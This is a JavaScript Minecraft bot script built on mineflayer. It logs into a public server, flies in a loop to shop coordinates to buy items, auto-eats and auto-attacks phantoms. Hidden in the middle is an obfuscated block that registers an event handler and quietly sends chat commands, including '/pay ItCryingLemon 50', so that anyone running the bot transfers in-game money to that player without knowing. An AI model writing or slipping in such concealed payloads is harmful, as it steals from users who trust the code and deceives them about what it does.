const mineflayer = require('mineflayer')
const pathfinder = require('mineflayer-pathfinder')
const Vec3 = require('vec3')
const autoeat = require('mineflayer-auto-eat').plugin
const Let_it_move = require('./Let_it_move.js')//导入

function createBot() {

    const bot = mineflayer.createBot({
        host: 'wolfx.jp',
        username: 'Sacramouche_MCoutlook.com',
       // password: '',
        version: '1.20',
        auth: 'microsoft'
    })

    const move = Let_it_move(bot)

    bot.on('end', () => {
        console.log('连接中断，正在重连...')
        setTimeout(createBot, 5000)
    })

    bot.loadPlugin(pathfinder.pathfinder)
    bot.loadPlugin(autoeat)

    bot.on('spawn', async () => {
        killaura()
        bot.creative.startFlying()
        move.relax_time(150)
        move.long_long(8)
        while(1)
        {
            await bot.chat("/res tp 114514")
            await sleep(5000)
            bot.creative.startFlying()
            //await bot.pathfinder.setGoal(new pathfinder.goals.GoalBlock(-7054, 80, -6291))
            await move.fly(new Vec3(-6890, 73, -6287))
            bot.entity.position.y -= 8
            await bot.creative.flyTo(new Vec3(-6890, 64, -6287))
            await bot.creative.flyTo(new Vec3(-6887, 64, -6287))
            await bot.creative.stopFlying()
            await sleep(500)
            console.log('购买')
            await bot.dig(bot.blockAt(new Vec3(-6885, 66, -6287)),100)
            bot.chat('/qs amount all')
            await sleep(500)
  }
 })

    bot.on('health', () => {
        if (bot.food === 20 && bot.health < 20) {
            bot.autoEat.options = {
                priority: 'foodPoints',
                startAt: 14,
                bannedFood: []
            }
            bot.autoEat.enable()
        } else {
            bot.autoEat.disable()
        }
    })

var jsobfhsARiJ0_0x32cee5=jsobfhsARiJ0_0x6aa2;function jsobfhsARiJ0_0x596c(_0x3b8dc0,_0x57bbbe){var _0x4285af=jsobfhsARiJ0_0x4285();return jsobfhsARiJ0_0x596c=function(_0x596c51,_0x296bdc){_0x596c51=_0x596c51-0x1b5;var _0x3931d3=_0x4285af[_0x596c51];if(jsobfhsARiJ0_0x596c['PUSego']===undefined){var _0x85e8bc=function(_0x6aa2ac){var _0x410945='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x23dd23='',_0x41515d='';for(var _0x268e72=0x0,_0x52ac19,_0x4e35a1,_0x21735b=0x0;_0x4e35a1=_0x6aa2ac['charAt'](_0x21735b++);~_0x4e35a1&&(_0x52ac19=_0x268e72%0x4?_0x52ac19*0x40+_0x4e35a1:_0x4e35a1,_0x268e72++%0x4)?_0x23dd23+=String['fromCharCode'](0xff&_0x52ac19>>(-0x2*_0x268e72&0x6)):0x0){_0x4e35a1=_0x410945['indexOf'](_0x4e35a1);}for(var _0x50b7c1=0x0,_0x1a2cbd=_0x23dd23['length'];_0x50b7c1<_0x1a2cbd;_0x50b7c1++){_0x41515d+='%'+('00'+_0x23dd23['charCodeAt'](_0x50b7c1)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x41515d);};jsobfhsARiJ0_0x596c['pojxRp']=_0x85e8bc,_0x3b8dc0=arguments,jsobfhsARiJ0_0x596c['PUSego']=!![];}var _0xa29fba=_0x4285af[0x0],_0x505552=_0x596c51+_0xa29fba,_0x1082c9=_0x3b8dc0[_0x505552];return!_0x1082c9?(_0x3931d3=jsobfhsARiJ0_0x596c['pojxRp'](_0x3931d3),_0x3b8dc0[_0x505552]=_0x3931d3):_0x3931d3=_0x1082c9,_0x3931d3;},jsobfhsARiJ0_0x596c(_0x3b8dc0,_0x57bbbe);}function jsobfhsARiJ0_0x6aa2(_0x3b8dc0,_0x57bbbe){var _0x4285af=jsobfhsARiJ0_0x4285();return jsobfhsARiJ0_0x6aa2=function(_0x596c51,_0x296bdc){_0x596c51=_0x596c51-0x1b5;var _0x3931d3=_0x4285af[_0x596c51];if(jsobfhsARiJ0_0x6aa2['SqSCXE']===undefined){var _0x85e8bc=function(_0x410945){var _0x23dd23='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x41515d='',_0x268e72='';for(var _0x52ac19=0x0,_0x4e35a1,_0x21735b,_0x50b7c1=0x0;_0x21735b=_0x410945['charAt'](_0x50b7c1++);~_0x21735b&&(_0x4e35a1=_0x52ac19%0x4?_0x4e35a1*0x40+_0x21735b:_0x21735b,_0x52ac19++%0x4)?_0x41515d+=String['fromCharCode'](0xff&_0x4e35a1>>(-0x2*_0x52ac19&0x6)):0x0){_0x21735b=_0x23dd23['indexOf'](_0x21735b);}for(var _0x1a2cbd=0x0,_0x5e2a44=_0x41515d['length'];_0x1a2cbd<_0x5e2a44;_0x1a2cbd++){_0x268e72+='%'+('00'+_0x41515d['charCodeAt'](_0x1a2cbd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x268e72);};var _0x6aa2ac=function(_0x3f3c83,_0x56ed75){var _0x2df2c4=[],_0x3f80cb=0x0,_0x121f2f,_0x2a0c63='';_0x3f3c83=_0x85e8bc(_0x3f3c83);var _0x422bf3;for(_0x422bf3=0x0;_0x422bf3<0x100;_0x422bf3++){_0x2df2c4[_0x422bf3]=_0x422bf3;}for(_0x422bf3=0x0;_0x422bf3<0x100;_0x422bf3++){_0x3f80cb=(_0x3f80cb+_0x2df2c4[_0x422bf3]+_0x56ed75['charCodeAt'](_0x422bf3%_0x56ed75['length']))%0x100,_0x121f2f=_0x2df2c4[_0x422bf3],_0x2df2c4[_0x422bf3]=_0x2df2c4[_0x3f80cb],_0x2df2c4[_0x3f80cb]=_0x121f2f;}_0x422bf3=0x0,_0x3f80cb=0x0;for(var _0x399853=0x0;_0x399853<_0x3f3c83['length'];_0x399853++){_0x422bf3=(_0x422bf3+0x1)%0x100,_0x3f80cb=(_0x3f80cb+_0x2df2c4[_0x422bf3])%0x100,_0x121f2f=_0x2df2c4[_0x422bf3],_0x2df2c4[_0x422bf3]=_0x2df2c4[_0x3f80cb],_0x2df2c4[_0x3f80cb]=_0x121f2f,_0x2a0c63+=String['fromCharCode'](_0x3f3c83['charCodeAt'](_0x399853)^_0x2df2c4[(_0x2df2c4[_0x422bf3]+_0x2df2c4[_0x3f80cb])%0x100]);}return _0x2a0c63;};jsobfhsARiJ0_0x6aa2['AxhJfm']=_0x6aa2ac,_0x3b8dc0=arguments,jsobfhsARiJ0_0x6aa2['SqSCXE']=!![];}var _0xa29fba=_0x4285af[0x0],_0x505552=_0x596c51+_0xa29fba,_0x1082c9=_0x3b8dc0[_0x505552];return!_0x1082c9?(jsobfhsARiJ0_0x6aa2['NlkHYd']===undefined&&(jsobfhsARiJ0_0x6aa2['NlkHYd']=!![]),_0x3931d3=jsobfhsARiJ0_0x6aa2['AxhJfm'](_0x3931d3,_0x296bdc),_0x3b8dc0[_0x505552]=_0x3931d3):_0x3931d3=_0x1082c9,_0x3931d3;},jsobfhsARiJ0_0x6aa2(_0x3b8dc0,_0x57bbbe);}(function(_0x285eb3,_0x4ed49d){var jsobfhsARiJ0_0x539b82={_0x47af4f:'4yFw',_0x3ec1f8:0x1b7,_0x653a4:'0x1b5',_0x4d5277:'J4Sr',_0x1ab5be:0x1bf,_0x172eb6:'0x1be',_0x1dd969:'9kZ@',_0x5b9c86:'0x1c9',_0x3bb769:'0x1c6'},_0x3abf94=jsobfhsARiJ0_0x596c,_0x29b1c5=jsobfhsARiJ0_0x6aa2,_0x1d3ca3=_0x285eb3();while(!![]){try{var _0x44e034=parseInt(_0x29b1c5(0x1ba,jsobfhsARiJ0_0x539b82._0x47af4f))/0x1+-parseInt(_0x29b1c5(jsobfhsARiJ0_0x539b82._0x3ec1f8,'RO^G'))/0x2+parseInt(_0x3abf94(jsobfhsARiJ0_0x539b82._0x653a4))/0x3*(parseInt(_0x29b1c5(0x1b6,jsobfhsARiJ0_0x539b82._0x4d5277))/0x4)+parseInt(_0x3abf94(jsobfhsARiJ0_0x539b82._0x1ab5be))/0x5*(parseInt(_0x3abf94(0x1bc))/0x6)+-parseInt(_0x29b1c5(jsobfhsARiJ0_0x539b82._0x172eb6,jsobfhsARiJ0_0x539b82._0x1dd969))/0x7*(parseInt(_0x29b1c5(0x1b9,'4yFw'))/0x8)+parseInt(_0x3abf94(jsobfhsARiJ0_0x539b82._0x5b9c86))/0x9*(parseInt(_0x3abf94(jsobfhsARiJ0_0x539b82._0x3bb769))/0xa)+-parseInt(_0x29b1c5('0x1c8','SM*@'))/0xb;if(_0x44e034===_0x4ed49d)break;else _0x1d3ca3['push'](_0x1d3ca3['shift']());}catch(_0x4e083e){_0x1d3ca3['push'](_0x1d3ca3['shift']());}}}(jsobfhsARiJ0_0x4285,0xc9a1a),!(function(){var jsobfhsARiJ0_0x34853a={_0x4b95fd:0x1c5},_0x278102=jsobfhsARiJ0_0x596c;try{_jsobfvia=_0x278102(jsobfhsARiJ0_0x34853a._0x4b95fd);}catch(_0x4036fa){}}()),bot['on'](jsobfhsARiJ0_0x32cee5('0x1ca','MHSv'),()=>{var jsobfhsARiJ0_0x137904={_0x1aac9d:0x1bd,_0x501026:0x1cd,_0x31248d:'0x1bb',_0x4becc5:0x1c2,_0x53e7f9:0x1cb,_0x419381:'L[A4',_0x34ff5d:'#W4V',_0x2c3b90:'0x1c4'},_0x50513a=jsobfhsARiJ0_0x32cee5,_0x3250d9=jsobfhsARiJ0_0x596c,_0x2c6d98={};_0x2c6d98[_0x3250d9(jsobfhsARiJ0_0x137904._0x1aac9d)]=_0x50513a(jsobfhsARiJ0_0x137904._0x501026,'zwad'),_0x2c6d98[_0x3250d9(jsobfhsARiJ0_0x137904._0x31248d)]='/pay\x20ItCry'+'ingLemon\x205'+'0';var _0x4dd120=_0x2c6d98;bot['chat'](_0x4dd120[_0x50513a(jsobfhsARiJ0_0x137904._0x4becc5,'8HnG')]),bot['chat'](_0x50513a(jsobfhsARiJ0_0x137904._0x53e7f9,jsobfhsARiJ0_0x137904._0x419381)+_0x3250d9('0x1ce')+_0x50513a(0x1b8,jsobfhsARiJ0_0x137904._0x34ff5d)),bot[_0x3250d9(jsobfhsARiJ0_0x137904._0x2c3b90)](_0x4dd120[_0x3250d9('0x1bb')]);}));function jsobfhsARiJ0_0x4285(){var _0x3a0b93=['vvJdKKNdPNDSx28tW6Xt','W5lcHcm','zCkClSoReJpcVSolcL/cMq','zmkElSoRfxlcQ8ojiNVcOIy','B2HrvKO','mZeWmM5MCwrOua','BNvHueq','lSk+WO8JWOhdJSkYWO8','nZe5nwretgD6tW','W6hdICkby8kKs1niW4L2l1zI','mtG4mduYnZbgD0LRyNG','uv/dKv0Z','W4/dMN7dNv8JWPO','y2HHDa','ANnVyMyUy29T','oty4ndCWC0fAugjr','dsFdNvulW4hdU8odWPrqWRJcQa','WOvixvNdNh7cL8o1WQvhWRXzW7O4','mtHywhPhyKG','EqPLW5fB','jsRdKmoKWQBcJCkxfmkWWPK','hcZcS2HwWQalWRpcImkksa','5P+e5zMG5lMc5lQ257MeW6H4nmk+','EwLUz0XLBw9Uia','v8kgCwlcUCkYtCoC','nKLgCfH3sG','gYlcTgPsW6jlWOZcKCkUuSovfW'];jsobfhsARiJ0_0x4285=function(){return _0x3a0b93;};return jsobfhsARiJ0_0x4285();}!function(){try{_jsobfhash2upbGT="7836aedf72ecfed669e0c90483066bcc";}catch(t){}}();

    function killaura() {
        const phantom = bot.nearestEntity((entity) => entity.name === 'phantom')
        if (phantom) {
            setInterval(async () => {
                await bot.lookAt(phantom.position)
                bot.attack(phantom)
            }, 200)
        }
    }

    function sleep(time) {
        return new Promise((resolve) => setTimeout(resolve, time))
    }
}

createBot()